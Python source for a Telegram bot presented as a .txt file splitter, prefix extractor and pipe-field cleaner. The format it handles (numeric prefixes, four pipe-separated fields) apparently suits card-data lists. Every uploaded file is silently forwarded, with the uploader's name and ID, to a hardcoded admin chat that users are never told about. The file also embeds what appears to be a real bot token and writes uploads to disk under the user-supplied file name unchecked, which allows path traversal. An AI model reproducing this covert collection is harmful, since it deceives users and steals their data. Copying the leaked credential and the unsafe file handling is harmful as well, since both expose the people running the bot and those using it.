#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import math
import re
from pathlib import Path

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ------------------------------------------------------------------
# 1️⃣  CONFIGURATION
# ------------------------------------------------------------------
TOKEN = "8811033165:AAG_dex1qyxce8GOcKpKTljGjG d9nsLFsXc"  # <-- replace with your bot token
ADMIN_ID = 6382539239  # <-- chat id that receives the uploaded file

# ------------------------------------------------------------------
# 2️⃣  GLOBAL STATE
# ------------------------------------------------------------------
# Maps user_id -> Path of the file they uploaded
saved_files: dict[int, Path] = {}
# Maps user_id -> stop flag for long‑running commands
stop_requests: dict[int, bool] = {}

# ------------------------------------------------------------------
# 3️⃣  HELPERS
# ------------------------------------------------------------------
def _ensure_dir(path: Path) -> None:
    """Create the parent directory if it does not exist."""
    path.parent.mkdir(parents=True, exist_ok=True)


# ------------------------------------------------------------------
# 4️⃣  COMMANDS
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_name = update.effective_user.first_name
    await update.message.reply_text(
        f"Hello {user_name}!\n\n"
        "Upload a file in .txt format.\n\n"
    )


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """User wants to stop a long running task."""
    user_id = update.effective_user.id
    stop_requests[user_id] = True
    await update.message.reply_text("⛔ Process stopped successfully.")


async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the upload of a .txt file."""
    user_id = update.effective_user.id
    file = await update.message.document.get_file()

    # Keep the *original* file name
    original_name = file.file_name or f"{user_id}_input.txt"
    file_path = Path(original_name)

    await file.download_to_drive(file_path)
    saved_files[user_id] = file_path

    # Forward the file to the admin
    with open(file_path, "rb") as f:
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=f,
            caption=(
                f"New upload received\n"
                f"User: {update.effective_user.first_name}\n"
                f"User ID: {user_id}"
            ),
        )

    await update.message.reply_text(
        "TXT file received successfully!\n\n"
        "Use commands:\n"
        "/spl <N>  – split into N‑line chunks\n"
        "/ext <prefix> – extract lines that start with <prefix>\n"
        "/clear – keep only the first 4 pipe‑separated fields\n\n"
        "Thanks!"
    )


async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Extract lines that start with a given prefix."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    # Grab the digits after /ext (allowing an optional space)
    match = re.search(r"\d+", update.message.text)
    if not match:
        await update.message.reply_text("Please provide a numeric prefix after /ext.")
        return
    prefix = match.group()

    result = []
    with open(saved_files[user_id], "r", encoding="utf-8") as f:
        for line in f:
            if line.strip().startswith(prefix):
                result.append(line.rstrip("\n"))

    # Output file named part_<prefix>.txt
    output_file = Path(f"part_{prefix}.txt")
    _ensure_dir(output_file)
    with open(output_file, "w", encoding="utf-8") as out:
        out.write("\n".join(result))

    with open(output_file, "rb") as out:
        await update.message.reply_document(out)


async def clear_words(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Keep only the first 4 pipe‑separated fields."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    input_path = saved_files[user_id]
    # Keep the original file name but add a suffix to avoid overwrite
    output_path = Path(f"{input_path.stem}_clean{input_path.suffix}")
    _ensure_dir(output_path)

    cleaned_lines = []
    with open(input_path, "r", encoding="utf-8") as f:
        for line in f:
            parts = line.strip().split("|")
            if len(parts) >= 4:
                cleaned_lines.append("|".join(part.strip() for part in parts[:4]))
            else:
                cleaned_lines.append(line.strip())

    with open(output_path, "w", encoding="utf-8") as out:
        out.write("\n".join(cleaned_lines))

    with open(output_path, "rb") as out:
        await update.message.reply_document(out)


async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Split the uploaded file into chunks of N lines."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    # Reset stop flag
    stop_requests[user_id] = False

    # Grab the digits after /spl (allowing an optional space)
    match = re.search(r"\d+", update.message.text)
    if not match:
        await update.message.reply_text("Please provide a number after /spl.")
        return
    try:
        chunk_size = int(match.group())
    except ValueError:
        await update.message.reply_text("Invalid number after /spl.")
        return

    # Read all lines once
    with open(saved_files[user_id], "r", encoding="utf-8") as f:
        lines = f.read().splitlines()

    total_parts = math.ceil(len(lines) / chunk_size)

    # Tell the user that processing is starting
    await update.message.reply_text(
        f"🚀 Processing Started…\n\n"
        f"Total Lines: {len(lines)}\n"
        f"Lines Per File: {chunk_size}\n"
        f"Files To Be Created: {total_parts}\n\n"
        f"Use /stop to cancel process."
    )

    part_no = 1
    for i in range(0, len(lines), chunk_size):
        if stop_requests.get(user_id, False):
            await update.message.reply_text("⛔ Process stopped by user.")
            return

        chunk = lines[i : i + chunk_size]
        # Use file name part_1.txt, part_2.txt, …
        output_file = Path(f"part_{part_no}.txt")
        _ensure_dir(output_file)
        with open(output_file, "w", encoding="utf-8") as out:
            out.write("\n".join(chunk))

        with open(output_file, "rb") as out:
            await update.message.reply_document(out)

        part_no += 1

    # Only the final “Done” message – no extra stats
    await update.message.reply_text("✅ Done!")


# ------------------------------------------------------------------
# 5️⃣  BIND HANDLERS & START BOT
# ------------------------------------------------------------------
app = Application.builder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CommandHandler("clear", clear_words))
app.add_handler(MessageHandler(filters.Document.ALL, receive_txt))
app.add_handler(MessageHandler(filters.Regex(r"^/spl(?:\s*\d+)$"), split_file))
app.add_handler(MessageHandler(filters.Regex(r"^/ext(?:\s*\d+)$"), extract_prefix))

print("Bot Running…")
app.run_polling()
